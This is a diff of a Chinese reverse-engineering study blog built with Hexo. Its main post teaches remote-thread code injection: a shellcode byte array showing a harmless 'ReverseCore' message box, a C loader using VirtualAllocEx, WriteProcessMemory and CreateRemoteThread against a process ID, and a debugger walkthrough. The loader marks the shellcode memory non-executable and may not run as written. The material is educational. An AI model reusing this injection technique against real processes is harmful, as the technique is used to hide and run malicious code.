-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="代码注入">
-                            
-                            <span class="card-title">代码注入</span>
-                        </div>
-                    </a>
-
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                代码注入
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-12
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                Gift1a
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/Windows/">
-                            <span class="chip bg-color">Windows</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="基础知识补充">
-                            
-                            <span class="card-title">基础知识补充</span>
-                        </div>
-                    </a>
-
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                C的一些基础知识
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-11
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                Gift1a
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/C/">
-                            <span class="chip bg-color">C</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2022/04/10/VEH/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="VEH">
-                            
-                            <span class="card-title">VEH</span>
-                        </div>
-                    </a>
-
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                VEH学习
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-10
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                Gift1a
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/Windows/">
-                            <span class="chip bg-color">Windows</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="shellcode知识">
-                            
-                            <span class="card-title">shellcode知识</span>
-                        </div>
-                    </a>
-
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                B站UP主的介绍，就想着看一下
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-10
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                Gift1a
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/Windows/">
-                            <span class="chip bg-color">Windows</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="DLL注入">
-                            
-                            <span class="card-title">DLL注入</span>
-                        </div>
-                    </a>
-
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                《逆向工程核心原理》DLL注入
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-09
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                Gift1a
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/Reverse/">
-                            <span class="chip bg-color">Reverse</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="Windows内核基础">
-                            
-                            <span class="card-title">Windows内核基础</span>
-                        </div>
-                    </a>
-
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                Windows应用程序基础
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-09
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                Gift1a
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/Windows/">
-                            <span class="chip bg-color">Windows</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-        </div>
-    </article>
-
-</main>
-
-
-<div class="container paging">
-    <div class="row">
-        <div class="col s6 m4 l4">
-            
-            <a class="left btn-floating btn-large disabled">
-                <i class="fas fa-angle-left"></i>
-            </a>
-            
-        </div>
-        <div class="page-info col m4 l4 hide-on-small-only">
-            <div class="center-align b-text-gray">1 / 5</div>
-        </div>
-        <div class="col s6 m4 l4">
-            
-            <a href="/page/2/"
-               class="right btn-floating btn-large waves-effect waves-light bg-color">
-                <i class="fas fa-angle-right"></i>
-            </a>
-            
-        </div>
-    </div>
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
 </div>
 
 
 
 
-    <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://gift1a.github.io/2022/04/15/Detours%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Gift1a">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/15/Detours%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">Detours学习</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-04-15 15:26:14" itemprop="dateCreated datePublished" datetime="2022-04-15T15:26:14+08:00">2022-04-15</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://gift1a.github.io/2022/04/15/API%E9%92%A9%E5%8F%96%E6%8A%80%E6%9C%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Gift1a">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/15/API%E9%92%A9%E5%8F%96%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">API钩取技术</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-04-15 14:28:13" itemprop="dateCreated datePublished" datetime="2022-04-15T14:28:13+08:00">2022-04-15</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://gift1a.github.io/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Gift1a">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/" class="post-title-link" itemprop="url">使用汇编语言编写注入代码</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-04-14 16:03:09" itemprop="dateCreated datePublished" datetime="2022-04-14T16:03:09+08:00">2022-04-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-04-15 14:06:39" itemprop="dateModified" datetime="2022-04-15T14:06:39+08:00">2022-04-15</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="0x00-设置"><a href="#0x00-设置" class="headerlink" title="0x00-设置"></a>0x00-设置</h1><p>修改EIP</p>
+<p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649925411946.png"></p>
+<p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649925229842.png"></p>
+<p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649925283278.png" alt="关闭自动填充nop"></p>
+<h1 id="0x01-修改汇编"><a href="#0x01-修改汇编" class="headerlink" title="0x01-修改汇编"></a>0x01-修改汇编</h1><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649926048838.png"></p>
+<p>输入字符串，Ctrl+E修改，注意字符串以0结尾，最后要加上00</p>
+<p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649926227498.png"></p>
+<p>可以发现得到的是汇编代码，OD会自动识别</p>
+<p>只需要选中字符串按下Ctrl+A即可转为字符串</p>
+<p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649926333629.png"></p>
+<p>同理修改好<a target="_blank" rel="noopener" href="http://www.reversecore.com字符串/">www.reversecore.com字符串</a></p>
+<h2 id="提取汇编"><a href="#提取汇编" class="headerlink" title="提取汇编"></a>提取汇编</h2><p>接下来将插入的asm的机器码进行复制（在内存窗口中复制对应长度的十六进制数据），并修改格式</p>
+<p>得到</p>
+<pre class="language-c" data-language="c"><code class="language-c">char shellcode[] = {
+0x55,0x8B,0xEC,0x8B,0x75,0x08,0x68,0x6C,0x6C,0x00,0x00,0x68,0x33,0x32,0x2E,0x64
+,0x68,0x75,0x73,0x65,0x72,0x54,0xFF,0x16,0x68,0x6F,0x78,0x41,0x00,0x68,0x61,0x67
+,0x65,0x42,0x68,0x4D,0x65,0x73,0x73,0x54,0x50,0xFF,0x56,0x04,0x6A,0x00,0xE8,0x0C
+,0x00,0x00,0x00,0x52,0x65,0x76,0x65,0x72,0x73,0x65,0x43,0x6F,0x72,0x65,0x00,0xE8
+,0x14,0x00,0x00,0x00,0x77,0x77,0x77,0x2E,0x72,0x65,0x76,0x65,0x72,0x73,0x65,0x63
+,0x6F,0x72,0x65,0x2E,0x63,0x6F,0x6D,0x00,0x6A,0x00,0xFF,0xD0,0x33,0xC0,0x8B,0xE5
+,0x5D,0xC3
+};</code></pre>
+
+<h1 id="0x02-代码实现"><a href="#0x02-代码实现" class="headerlink" title="0x02-代码实现"></a>0x02-代码实现</h1><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;Windows.h&gt;
+#include&lt;string.h&gt;
+
+BYTE shellcode[] = {
+ 0x55,0x8B,0xEC,0x8B,0x75,0x08,0x68,0x6C,0x6C,0x00,0x00,0x68,0x33,0x32,0x2E,0x64
+,0x68,0x75,0x73,0x65,0x72,0x54,0xFF,0x16,0x68,0x6F,0x78,0x41,0x00,0x68,0x61,0x67
+,0x65,0x42,0x68,0x4D,0x65,0x73,0x73,0x54,0x50,0xFF,0x56,0x04,0x6A,0x00,0xE8,0x0C
+,0x00,0x00,0x00,0x52,0x65,0x76,0x65,0x72,0x73,0x65,0x43,0x6F,0x72,0x65,0x00,0xE8
+,0x14,0x00,0x00,0x00,0x77,0x77,0x77,0x2E,0x72,0x65,0x76,0x65,0x72,0x73,0x65,0x63
+,0x6F,0x72,0x65,0x2E,0x63,0x6F,0x6D,0x00,0x6A,0x00,0xFF,0xD0,0x33,0xC0,0x8B,0xE5
+,0x5D,0xC3
+};
+
+typedef struct _Thread_Param
+{
+	FARPROC pFunc[2];//Loadlibrary,GetProcAddress
+}Thread_Param, * pThread_Param;
+
+void Asm_Inject(DWORD PID)
+{
+	HMODULE hMod = NULL;
+	HANDLE hProcess = NULL;
+	Thread_Param param[2] = { 0, };
+	HANDLE hThread = NULL;
+	LPVOID pRemoteBuf[2] = { 0, };
+
+	//获取kernel32.dll的句柄
+	hMod = GetModuleHandleA("kernel32.dll");
+	//将需要使用的函数存储
+	param-&gt;pFunc[0] = GetProcAddress(hMod, "LoadLibraryA");
+	param-&gt;pFunc[1] = GetProcAddress(hMod, "GetProcAddress");
+
+	//开启进程
+	if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID)))
+	{
+		printf("Open Failed!!Error Code:%d\n", GetLastError());
+		return;
+	}
+
+	//开辟空间并写入
+	if (!(pRemoteBuf[0] = VirtualAllocEx(hProcess, NULL, sizeof(Thread_Param), MEM_COMMIT, PAGE_READWRITE)))
+	{
+		printf("VirtualAlloc Failed!!Error Code:%d\n", GetLastError());
+		return;
+	}
+
+	if (!WriteProcessMemory(hProcess, pRemoteBuf[0], (LPVOID)&amp;param, sizeof(Thread_Param), NULL))
+	{
+		printf("WriteProcess Failed!!Error Code:%d\n", GetLastError());
+		return;
+	}
+
+	//将我们的shellcode写入
+	if (!(pRemoteBuf[1] = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_READWRITE)))
+	{
+		printf("VirtualAlloc Failed!!Error Code:%d\n", GetLastError());
+		return;
+	}
+
+	if (!WriteProcessMemory(hProcess, pRemoteBuf[1], (LPVOID)&amp;shellcode, sizeof(shellcode), NULL))
+	{
+		printf("WriteProcess Failed!!Error Code:%d\n", GetLastError());
+		return;
+	}
+	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuf[1], pRemoteBuf[0], 0, NULL);
+
+	WaitForSingleObject(hThread, INFINITE);
+	CloseHandle(hThread);
+	CloseHandle(hProcess);
+	return;
+}
+
+
+int main(int argc,char*argv[])
+{
+	Asm_Inject((DWORD)atol(argv[1]));
+	return 0;
+}</code></pre>
+
+<p>本质上和代码注入没区别，主要是我们将字符串也包含在了注入的代码里面，所以在线程函数中不再需要使用字符数组存储</p>
+<h1 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03-分析"></a>0x03-分析</h1><p>在OD中打开并注入，让其停在新线程</p>
+<p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650001855752.png"></p>
+<p>先提升堆栈，然后将函数的参数存入ESI中，也就是线程函数对应的THREAD_PARAM结构体，因为里面只有两个函数指针，所以大小为0x8</p>
+<p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002105819.png" alt="ESI的值"></p>
+<p>我们执行完移动到esi这一步，去内存中查看ESI存储的值</p>
+<p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002164069.png"></p>
+<p>将其转为地址，注释中会告知我们其对应的API函数</p>
+<p>接下来的四个PUSH+call可以知道是调用函数，LoadLibraryA只需要一个参数</p>
+<p>前面三个PUSH是将函数名称压入栈，而最后一个是将当前的ESP的值压入栈，而当前ESP的值正好是存储字符串的地址，这样就实现了给LoadLibraryA传参</p>
+<p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002382351.png"></p>
+<p>需要注意这里是小端序</p>
+<p>接下来的四个PUSH和前面是一样的，关键是最后一个PUSH</p>
+<blockquote>
+<p><strong>因为返回值一般存储在EAX，并且函数调用时入栈顺序是从右往左依次入栈</strong></p>
+</blockquote>
+<p>这里的EAX存储的值就是user32.dll的句柄，也就是地址，在eax寄存器中OD也自动标明了</p>
+<p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002603450.png"></p>
+<p>最后获取到MessageBoxA的地址</p>
+<p>MessageBoxA的传参</p>
+<p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002654110.png"></p>
+<p>这一段本来是字符串，但是OD给我们识别成了代码</p>
+<p>执行完之后</p>
+<p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002721021.png"></p>
+<p>可以看到我们的MessageBoxA的参数都在栈中了</p>
+<p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002770898.png" alt="调用MessageBoxA"></p>
+<p>最后就是清空eax和恢复堆栈了</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://gift1a.github.io/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Gift1a">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/" class="post-title-link" itemprop="url">加密与解密第四版</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-04-13 09:18:40 / 修改时间：11:21:49" itemprop="dateCreated datePublished" datetime="2022-04-13T09:18:40+08:00">2022-04-13</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00-基础知识"></a>0x00-基础知识</h1><h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814834555.png"></p>
+<h2 id="大小端序"><a href="#大小端序" class="headerlink" title="大小端序"></a>大小端序</h2><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814898304.png"></p>
+<h2 id="Windows操作系统"><a href="#Windows操作系统" class="headerlink" title="Windows操作系统"></a>Windows操作系统</h2><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814924513.png" alt="重要DLL"></p>
+<p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814970448.png" alt="Unicode与ANSI函数"></p>
+<h2 id="WOW64"><a href="#WOW64" class="headerlink" title="WOW64"></a>WOW64</h2><p>WOW64是64位Windows操作系统的子系统，可以使大多数32位应用程序在不修改的情况下运行在64位操作系统上</p>
+<p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649815151630.png" alt="WOW64操作过程"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://gift1a.github.io/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Gift1a">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/" class="post-title-link" itemprop="url">Windows核心编程</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-04-13 09:06:43" itemprop="dateCreated datePublished" datetime="2022-04-13T09:06:43+08:00">2022-04-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-04-15 19:20:51" itemprop="dateModified" datetime="2022-04-15T19:20:51+08:00">2022-04-15</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="0x00-错误处理"><a href="#0x00-错误处理" class="headerlink" title="0x00-错误处理"></a>0x00-错误处理</h1><p>在WinError.h头文件中包含了Microsoft定义的错误代码列表，每个错误都有三种表示：一个消息ID(一个可在源代码使用的宏，用于与GetLastError的返回值进行比较)、消息文本(描述错误的英文文本)和一个编号(应该避免使用此编号，尽量使用消息ID)</p>
+<p>所以在Windows函数失败之后，应该立马调用GetLastError()</p>
+<h1 id="0x01-字符和字符串处理"><a href="#0x01-字符和字符串处理" class="headerlink" title="0x01-字符和字符串处理"></a>0x01-字符和字符串处理</h1><h2 id="ANSI与UNCODE"><a href="#ANSI与UNCODE" class="headerlink" title="ANSI与UNCODE"></a>ANSI与UNCODE</h2><blockquote>
+<p>在Windows Vista中，每个Unicode字符都使用UTF-16编码，UTF-16将每个字符编码为2个字节也就是16位</p>
+</blockquote>
+<p>我们知道在C语言中，char数据类型表示一个8位ANSI字符，也就是一个字节</p>
+<p>当我们声明Unicode字符和字符串时，只需要在字符串前加上”L“，表示以UTF-16来编码每个字符</p>
+<p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1649813453705.png"></p>
+<h2 id="Unicode函数与ANSI函数"><a href="#Unicode函数与ANSI函数" class="headerlink" title="Unicode函数与ANSI函数"></a>Unicode函数与ANSI函数</h2><p>自Windows NT起，Windows所有的版本都完全用Unicode来构建。也就是说所有核心函数(创建窗口、显示文本、进行字符串处理)都需要Unicode字符串</p>
+<p>在Windows中，Windows函数通常具有两个版本，用于接收不同的字符串</p>
+<p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1649813717040.png"></p>
